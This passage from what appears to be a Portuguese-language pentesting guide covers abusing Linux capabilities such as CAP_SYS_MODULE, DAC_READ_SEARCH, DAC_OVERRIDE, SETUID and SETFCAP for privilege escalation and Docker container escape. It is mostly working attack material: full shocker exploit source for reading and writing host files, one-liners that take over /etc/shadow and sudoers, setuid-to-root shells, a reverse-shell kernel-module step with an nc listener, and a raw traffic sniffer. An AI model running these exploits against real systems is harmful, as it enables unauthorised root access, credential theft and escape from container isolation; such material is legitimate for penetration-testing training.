> O caractere em branco antes de cada comando `make` no Makefile **deve ser uma tabulação, não espaços**!

Execute `make` para compilá-lo.
```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
Finalmente, inicie `nc` dentro de um shell e **carregue o módulo** a partir de outro, e você capturará o shell no processo do nc:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**O código desta técnica foi copiado do laboratório "Abusing SYS_MODULE Capability" de** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

Outro exemplo desta técnica pode ser encontrado em [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permite que um processo **contorne as permissões para ler arquivos e para ler e executar diretórios**. Seu uso principal é para fins de pesquisa ou leitura de arquivos. No entanto, também permite que um processo use a função `open_by_handle_at(2)`, que pode acessar qualquer arquivo, incluindo aqueles fora do mount namespace do processo. O handle usado em `open_by_handle_at(2)` deveria ser um identificador não transparente obtido por meio de `name_to_handle_at(2)`, mas pode incluir informações sensíveis, como números de inode, que são vulneráveis a adulteração. O potencial de exploração desta capability, especialmente no contexto de Docker containers, foi demonstrado por Sebastian Krahmer com o exploit shocker, conforme analisado [aqui](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).
**Isso significa que você pode** **contornar as verificações de permissão de leitura de arquivos e as verificações de permissão de leitura/execução de diretórios.**

**Exemplo com um binário**

O binário poderá ler qualquer arquivo. Portanto, se um arquivo como o tar tiver esta capability, ele poderá ler o arquivo shadow:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**Exemplo com binary2**

Neste caso, vamos supor que o binário **`python`** tenha esta capability. Para listar arquivos do root, você poderia fazer:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
E, para ler um arquivo, você poderia fazer:
```python
print(open("/etc/shadow", "r").read())
```
**Exemplo no Environment (Docker breakout)**

Você pode verificar as capabilities habilitadas dentro do container Docker usando:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Dentro da saída anterior, você pode ver que a capability **DAC_READ_SEARCH** está habilitada. Como resultado, o container pode **depurar processos**.

Você pode aprender como funciona o exploit a seguir em [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3), mas, em resumo, **CAP_DAC_READ_SEARCH** não apenas nos permite percorrer o sistema de arquivos sem verificações de permissão, como também remove explicitamente quaisquer verificações para _**open_by_handle_at(2)**_ e **poderia permitir que nosso processo acessasse arquivos sensíveis abertos por outros processos**.

O exploit original que abusa dessas permissões para ler arquivos do host pode ser encontrado aqui: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c); a seguir está uma **versão modificada que permite indicar o arquivo que você deseja ler como primeiro argumento e gravá-lo em um arquivo.**
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
> [!WARNING]
> O exploit precisa encontrar um ponteiro para algo montado no host. O exploit original usava o arquivo /.dockerinit, e esta versão modificada usa /etc/hostname. Se o exploit não estiver funcionando, talvez seja necessário definir um arquivo diferente. Para encontrar um arquivo montado no host, basta executar o comando mount:

![CAP SYS MODULE - CAP DAC READ SEARCH: O exploit precisa encontrar um ponteiro para algo montado no host. O exploit original usava o arquivo /.dockerinit, e esta versão modificada usa...](<../../images/image (407) (1).png>)

**O código desta técnica foi copiado do laboratório "Abusing DAC_READ_SEARCH Capability" de** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)


## CAP_DAC_OVERRIDE

**Isso significa que você pode ignorar as verificações de permissão de escrita em qualquer arquivo, podendo escrever em qualquer arquivo.**

Há muitos arquivos que você pode **sobrescrever para escalar privilégios,** [**você pode obter ideias aqui**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Exemplo com binário**

Neste exemplo, o vim possui esta capability, portanto você pode modificar qualquer arquivo, como _passwd_, _sudoers_ ou _shadow_:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**Exemplo com o binário 2**

Neste exemplo, o binário **`python`** terá esta capability. Você poderia usar o python para sobrescrever qualquer arquivo:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**Exemplo com environment + CAP_DAC_READ_SEARCH (Docker breakout)**

Você pode verificar as capabilities habilitadas dentro do container Docker usando:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Primeiro, leia a seção anterior que [**abusa da capacidade DAC_READ_SEARCH para ler arquivos arbitrários**](linux-capabilities.md#cap_dac_read_search) do host e **compile** o exploit.\
Em seguida, **compile a seguinte versão do exploit shocker**, que permitirá **gravar arquivos arbitrários** no sistema de arquivos do host:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Para escapar do container docker, você poderia **baixar** os arquivos `/etc/shadow` e `/etc/passwd` do host, **adicionar** a eles um **novo usuário** e usar **`shocker_write`** para sobrescrevê-los. Em seguida, **acessar** via **ssh**.

**O código dessa técnica foi copiado do laboratório "Abusing DAC_OVERRIDE Capability" de** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)

## CAP_CHOWN

**Isso significa que é possível alterar o proprietário de qualquer arquivo.**

**Exemplo com binary**

Suponha que o **`python`** binary tenha essa capability; você pode **alterar** o **proprietário** do arquivo **`shadow`**, **alterar a senha do root** e escalar privilégios:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
Ou com o binário **`ruby`** possuindo esta capability:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP_FOWNER

**Isso significa que é possível alterar as permissões de qualquer arquivo.**

**Exemplo com binary**

Se o Python tiver essa capability, você poderá modificar as permissões do arquivo shadow, **alterar a senha do root** e escalar privilégios:
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP_SETUID

**Isso significa que é possível definir o ID de usuário efetivo do processo criado.**

**Exemplo com binário**

Se o Python tiver essa **capacidade**, você poderá abusar dela facilmente para escalar privilégios para root:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**Outra forma:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP_SETGID

**Isso significa que é possível definir o ID de grupo efetivo do processo criado.**

Existem muitos arquivos que você pode **sobrescrever para escalar privilégios,** [**você pode obter ideias aqui**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Exemplo com binary**

Nesse caso, você deve procurar arquivos interessantes que um grupo possa ler, pois pode personificar qualquer grupo:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
Depois de encontrar um arquivo que você possa explorar (por meio de leitura ou escrita) para elevar privilégios, você pode **obter um shell personificando o grupo interessante** com:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
Neste caso, o grupo shadow foi personificado, então você pode ler o arquivo `/etc/shadow`:
```bash
cat /etc/shadow
```
### Cadeia combinada: CAP_SETGID + CAP_CHOWN

Quando ambas as capabilities estão disponíveis no mesmo helper, uma cadeia prática é:

1. Alterar o EGID para `shadow` (ou outro grupo privilegiado).
2. Usar `chown` em `/etc/shadow` para definir seu UID, mantendo o grupo `shadow`.
3. Ler um hash alvo e fazer crack/pivot.
```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```
Isso evita a necessidade de obter acesso root completo diretamente e geralmente é suficiente para realizar pivoting por meio da reutilização de credenciais.

Se o **docker** estiver instalado, você poderá **impersonate** o **docker group** e abusar dele para se comunicar com o [**docker socket** e escalar privilégios](#writable-docker-socket).

## CAP_SETFCAP

**Isso significa que é possível definir capabilities em arquivos e processos**

**Exemplo com binary**

Se o python tiver essa **capability**, você poderá abusar dela muito facilmente para escalar privilégios para root:
```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```
> [!WARNING]
> Observe que, se você definir uma nova capability no binário com CAP_SETFCAP, perderá esta capability.

Depois de obter a [SETUID capability](linux-capabilities.md#cap_setuid), você pode acessar a seção correspondente para ver como escalar privilégios.

**Exemplo com environment (Docker breakout)**

Por padrão, a capability **CAP_SETFCAP é concedida ao processo dentro do container no Docker**. Você pode verificar isso executando algo como:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
Esta capability permite **atribuir qualquer outra capability a binários**, portanto, poderíamos pensar em **escapar** do container **abusando de qualquer um dos outros breakouts de capabilities** mencionados nesta página.\
No entanto, se você tentar atribuir, por exemplo, as capabilities CAP_SYS_ADMIN e CAP_SYS_PTRACE ao binário gdb, verá que é possível atribuí-las, mas o **binário não conseguirá ser executado depois disso**:
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
[Da documentação](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Permitted: Este é um **superset limitador para as capabilities efetivas** que a thread pode assumir. Também é um superset limitador para as capabilities que podem ser adicionadas ao conjunto herdável por uma thread que **não possui a capability CAP_SETPCAP** em seu conjunto efetivo._\
Parece que as capabilities Permitted limitam aquelas que podem ser usadas.\
No entanto, o Docker também concede **CAP_SETPCAP** por padrão, então talvez seja possível **definir novas capabilities dentro do conjunto herdável**.\
No entanto, na documentação dessa capability: _CAP_SETPCAP: \[…] **adicionar qualquer capability do conjunto de bounding da thread chamadora ao seu conjunto herdável**_.\
Parece que só podemos adicionar ao conjunto herdável capabilities do conjunto de bounding. Isso significa que **não podemos colocar novas capabilities, como CAP_SYS_ADMIN ou CAP_SYS_PTRACE, no conjunto herdável para realizar privilege escalation**.

## CAP_SYS_RAWIO

[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) fornece várias operações sensíveis, incluindo acesso a `/dev/mem`, `/dev/kmem` ou `/proc/kcore`, modificação de `mmap_min_addr`, acesso às system calls `ioperm(2)` e `iopl(2)` e vários comandos de disco. O `FIBMAP ioctl(2)` também é habilitado por meio dessa capability, o que já causou problemas no [passado](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html). De acordo com a página de manual, isso também permite que o detentor **realize descritivamente uma série de operações específicas do dispositivo em outros dispositivos**.

Isso pode ser útil para **privilege escalation** e **Docker breakout.**

## CAP_KILL

**Isso significa que é possível matar qualquer processo.**

**Exemplo com um binário**

Suponhamos que o binário **`python`** tenha essa capability. Se você também pudesse **modificar alguma configuração de service ou socket** (ou qualquer arquivo de configuração relacionado a um service), poderia inserir um backdoor nele, matar o processo relacionado a esse service e aguardar que o novo arquivo de configuração fosse executado com o seu backdoor.
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Privesc com kill**

Se você tiver capabilities de kill e houver um **node program em execução como root** (ou como um usuário diferente), provavelmente poderá **enviar** a ele o **signal SIGUSR1** e fazer com que ele **abra o node debugger**, ao qual você poderá se conectar.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{{#ref}}
../software-information/electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**Isso significa que é possível escutar em qualquer porta (até mesmo nas privilegiadas). Não é possível escalar privilégios diretamente com essa capability.**

**Exemplo com binário**

Se **`python`** tiver essa capability, será capaz de escutar em qualquer porta e até mesmo conectar-se a partir dela a qualquer outra porta (alguns serviços exigem conexões provenientes de portas com privilégios específicos)

{{#tabs}}
{{#tab name="Listen"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{{#endtab}}

{{#tab name="Connect"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

A capability [**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permite que processos **criem sockets RAW e PACKET**, possibilitando gerar e enviar pacotes de rede arbitrários. Isso pode gerar riscos de segurança em ambientes conteinerizados, como packet spoofing, injeção de tráfego e bypass de controles de acesso à rede. Atores maliciosos poderiam explorar isso para interferir no roteamento do container ou comprometer a segurança da rede do host, especialmente sem proteções adequadas de firewall. Além disso, **CAP_NET_RAW** é essencial para que containers privilegiados executem operações como ping por meio de requisições ICMP RAW.

**Isso significa que é possível sniffar tráfego.** Não é possível escalar privilégios diretamente com essa capability.

**Exemplo com binário**

Se o binário **`tcpdump`** tiver essa capability, você poderá usá-lo para capturar informações da rede.
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
Observe que, se o **ambiente** estiver fornecendo esse capability, você também poderá usar o **`tcpdump`** para sniffar o tráfego.

**Exemplo com o binário 2**

O exemplo a seguir é um código em **`python2`** que pode ser útil para interceptar o tráfego da interface "**lo**" (**localhost**). O código é proveniente do lab "_The Basics: CAP-NET_BIND + NET_RAW_" em [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com).
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP_NET_ADMIN + CAP_NET_RAW

A capability [**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) concede ao titular o poder de **alterar configurações de rede**, incluindo configurações de firewall, tabelas de roteamento, permissões de sockets e configurações de interfaces de rede dentro dos network namespaces expostos. Ela também permite ativar o **promiscuous mode** nas interfaces de rede, possibilitando a captura de pacotes entre namespaces.

**Exemplo com binary**

Suponhamos que o **python binary** tenha essas capabilities.
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP_LINUX_IMMUTABLE

**Isso significa que é possível modificar atributos do inode.** Você não pode escalar privilégios diretamente com essa capability.

**Exemplo com binário**

Se você descobrir que um arquivo é immutable e o Python tem essa capability, poderá **remover o atributo immutable e tornar o arquivo modificável:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
> [!TIP]
> Observe que normalmente este atributo imutável é definido e removido usando:
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permite a execução da system call `chroot(2)`, o que pode permitir escapar de ambientes `chroot(2)` por meio de vulnerabilidades conhecidas:

- [How to break out from various chroot solutions](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [chw00t: chroot escape tool](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) não apenas permite a execução da system call `reboot(2)` para reinicializações do sistema, incluindo comandos específicos como `LINUX_REBOOT_CMD_RESTART2`, adaptados para determinadas plataformas de hardware, mas também permite o uso de `kexec_load(2)` e, a partir do Linux 3.17, de `kexec_file_load(2)` para carregar novos crash kernels ou crash kernels assinados, respectivamente.

## CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) foi separado do **CAP_SYS_ADMIN** mais abrangente no Linux 2.6.37, concedendo especificamente a capacidade de usar a chamada `syslog(2)`. Essa capability permite visualizar endereços do kernel por meio de `/proc` e interfaces semelhantes quando a configuração `kptr_restrict` está definida como 1, controlando a exposição dos endereços do kernel. Desde o Linux 2.6.39, o valor padrão de `kptr_restrict` é 0, o que significa que os endereços do kernel ficam expostos, embora muitas distribuições definam esse valor como 1 (ocultar endereços, exceto para uid 0) ou 2 (sempre ocultar endereços) por motivos de segurança.

Além disso, **CAP_SYSLOG** permite acessar a saída de `dmesg` quando `dmesg_restrict` está definida como 1. Apesar dessas mudanças, **CAP_SYS_ADMIN** mantém a capacidade de executar operações `syslog` devido a precedentes históricos.

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) amplia a funcionalidade da system call `mknod` para além da criação de arquivos regulares, FIFOs (named pipes) ou UNIX domain sockets. Ela permite especificamente a criação de arquivos especiais, que incluem:

- **S_IFCHR**: Arquivos especiais de caracteres, que são dispositivos como terminais.
- **S_IFBLK**: Arquivos especiais de blocos, que são dispositivos como discos.

Essa capability é essencial para processos que precisam criar arquivos de dispositivo, facilitando a interação direta com o hardware por meio de dispositivos de caracteres ou blocos.

Ela é uma capability padrão do docker ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).

Essa capability permite realizar privilege escalations (por meio da leitura completa do disco) no host, sob estas condições:

1. Ter acesso inicial ao host (Unprivileged).
2. Ter acesso inicial ao container (Privileged (EUID 0), e `CAP_MKNOD` efetiva).
3. O host e o container devem compartilhar o mesmo user namespace.

**Etapas para Criar e Acessar um Block Device em um Container:**

1. **No Host como um Usuário Padrão:**

- Determine seu ID de usuário atual com `id`, por exemplo, `uid=1000(standarduser)`.
- Identifique o dispositivo-alvo, por exemplo, `/dev/sdb`.

2. **Dentro do Container como `root`:**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **De volta ao Host:**
```bash
# Locate the PID of the container process owned by "standarduser"
